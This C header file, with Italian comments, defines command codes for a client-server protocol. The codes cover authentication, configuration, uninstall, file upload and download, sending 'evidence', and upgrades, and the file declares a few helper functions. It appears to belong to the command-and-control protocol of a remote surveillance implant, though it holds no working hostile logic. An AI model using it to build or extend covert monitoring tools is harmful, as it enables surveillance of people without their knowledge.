#ifndef _PROTO_H
#define _PROTO_H


#define INVALID_COMMAND         (UINT)0x0       // Non usare
#define PROTO_OK                (UINT)0x1       // OK
#define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
#define PROTO_BYE               (UINT)0x3       // Chiusura di connessione
#define PROTO_CHALLENGE         (UINT)0x4       // Autenticazione
#define PROTO_ID                (UINT)0xf       // Identificazione    
#define PROTO_NEW_CONF          (UINT)0x7       // Nuova configurazione
#define PROTO_UNINSTALL         (UINT)0xa       // Disinstallazione
#define PROTO_DOWNLOAD          (UINT)0xc       // DOWNLOAD, restituisce la lista dei nomi(in WCHAR, NULL terminati)
#define PROTO_UPLOAD            (UINT)0xd       // UPLOAD, restituisce la lista di coppie: nome,directory.
#define PROTO_EVIDENCE_SIZE     (UINT)0x0b      // Spedisce le informazioni sulle evidence che verranno mandate
#define PROTO_EVIDENCE          (UINT)0x09      // Spedisce un evidence
#define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
#define PROTO_FILESYSTEM        (UINT)0x19      // Riceve le richieste relative al filesystem




VOID ProtoAuthenticate();
ULONG Align(ULONG uSize, ULONG uAlignment);
VOID GenerateRandomData(PBYTE pBuffer, ULONG uBuffLen);
BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize);

#endif